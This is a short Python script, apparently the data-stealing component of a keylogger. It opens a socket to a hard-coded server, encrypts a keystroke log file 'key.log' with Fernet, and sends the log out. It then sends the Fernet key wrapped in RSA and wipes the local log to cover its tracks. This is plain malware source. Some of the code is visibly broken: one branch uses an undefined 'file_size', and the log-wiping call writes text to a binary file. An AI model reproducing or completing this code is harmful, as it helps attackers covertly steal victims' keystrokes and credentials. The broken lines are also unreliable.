import socket
import os
from cryptography.fernet import Fernet
import rsa

SERVER = '192.168.29.131'
PORT = 8865
log_file = 'key.log'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))


def prep_key():
    key = open('fernet.key', 'rb').read()
    asym_key = rsa.PublicKey.load_pkcs1(open('public.key', 'rb').read())
    return rsa.encrypt(key, asym_key)


def symm_encrypt(text):
    key = Fernet(open('fernet.key', 'rb').read())
    return key.encrypt(text)


def encrypt_logs():
    data = open(log_file, 'rb').read()
    with open(log_file, 'wb') as logfile:
        logfile.write(symm_encrypt(data))


def del_logs():
    open(log_file, 'wb').write('')


def send_data(file, recv_fname, data=None):
    '''
    if file == 0: then we are sending reading data from a file but a variable in data
    '''
    if file != 0:
        file_size = os.path.getsize(file)
        data = open(file, 'rb').read()

    client.send(recv_fname.encode())
    client.send(str(file_size).encode())

    client.sendall(data)
    client.send(b'<END OF FILE>')


def exfil_data():
    encrypt_logs()
    send_data(log_file, 'recv_key.log')
    send_data(0, 'fernet.key', prep_key())
    client.close()
    del_logs()


exfil_data()
